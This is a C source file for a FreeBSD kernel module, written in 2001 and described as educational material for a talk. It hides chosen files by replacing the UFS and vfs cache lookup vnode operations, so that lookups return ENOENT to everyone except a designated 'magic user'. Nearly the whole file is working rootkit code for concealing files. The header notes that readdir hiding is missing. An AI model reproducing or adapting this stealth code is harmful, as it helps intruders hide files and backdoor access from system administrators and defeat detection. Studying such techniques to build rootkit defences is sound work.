/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    $Id: file-ufs.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 *
 *    This is an example of how to hide a file not by replacing syscalls,
 *    but by replacing the ufs functions. Note that this will then also
 *    only work for a ufs filesystem, so no nfs mounted stuff :)
 *    This is a lot less hasle then replacing all the syscalls.
 *
 *    This version does not include a replacement for readdir, this means
 *    that your file will be hidden from ls -l but not from ls only.
 *    I have this somewhere but since I'm in a bit of time pressure to collect
 *    this all from the machines I worked on before my talk at HAL, it's
 *    missing. I'll put up a new version including this stuff after HAL.
 *
 *    This software was written for educational purposes only.
 */


#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/sysproto.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/file.h>
#include <sys/malloc.h>
#include <sys/namei.h>
#include <sys/kernel.h>
#include <dirent.h>

#include "../config.h"
#include "vnode.h"
#include "util.h"
#include "file-ufs.h"

#ifdef FILE_UFS

extern vop_t *old_ufs_lookup;
extern vop_t *old_vfs_cache_lookup;


/*
 *    ufs lookup replacement
 */

int
new_ufs_lookup(struct vop_cachedlookup_args *ap)
{

    struct componentname *cnp = ap->a_cnp;

    if(file_hidden(cnp->cn_nameptr) && 
        !(is_magic_user((cnp->cn_cred)->cr_uid))) {
        mod_debug("Hiding file %s\n",cnp->cn_nameptr);
        return(ENOENT);
    }

    return(old_ufs_lookup(ap));
}

/*
 * vfs_cached_lookup wrapper function
 */

int
new_vfs_cache_lookup(struct vop_lookup_args *ap)
{
    struct componentname *cnp = ap->a_cnp;

    if(file_hidden(cnp->cn_nameptr) && 
        !(is_magic_user((cnp->cn_cred)->cr_uid))) {
        mod_debug("Hiding file %s\n",cnp->cn_nameptr);
        return(ENOENT);
    }

    return(old_vfs_cache_lookup(ap));
}

#endif /* FILE_UFS */
